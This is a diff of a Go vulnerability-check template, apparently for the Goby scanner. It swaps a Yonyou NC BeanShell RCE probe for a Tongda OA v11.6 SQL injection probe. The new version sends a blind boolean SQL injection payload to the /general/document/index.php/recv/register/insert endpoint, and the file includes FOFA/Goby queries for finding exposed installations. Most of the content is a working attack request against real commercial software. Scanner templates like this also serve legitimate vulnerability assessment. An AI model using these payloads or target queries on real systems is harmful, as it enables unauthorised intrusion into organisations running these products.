@@ -6,15 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "通达OA v11.6 insert SQL注入漏洞",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "Level": "3",
+  "FofaQuery": "app=\"TDXK-通达OA\" || product=\"TDXK-通达OA\"",
+  "GobyQuery": "app=\"TDXK-通达OA\" || product=\"TDXK-通达OA\"",
+  "Level": "2",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -29,12 +29,14 @@ func init() {
     "AND",
     {
       "Request": {
-        "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "method": "POST",
+        "uri": "/general/document/index.php/recv/register/insert",
         "follow_redirect": true,
-        "header": {},
+        "header": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
         "data_type": "text",
-        "data": ""
+        "data": "title)values(\"'\"^exp(if(ascii(substr(MOD(5,2),1,1))<128,1,710)))# =1&_SERVER="
       },
       "ResponseTest": {
         "type": "group",
@@ -44,14 +46,7 @@ func init() {
             "type": "item",
             "variable": "$code",
             "operation": "==",
-            "value": "200",
-            "bz": ""
-          },
-          {
-            "type": "item",
-            "variable": "$body",
-            "operation": "contains",
-            "value": "BeanShell",
+            "value": "302",
             "bz": ""
           }
         ]
@@ -107,7 +102,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "通达OA v11.6 insert SQL注入漏洞",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +111,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "tongda OA v11.6 insert SQL injection",
       "Product": "",
       "Description": "",
       "Recommendation": "",
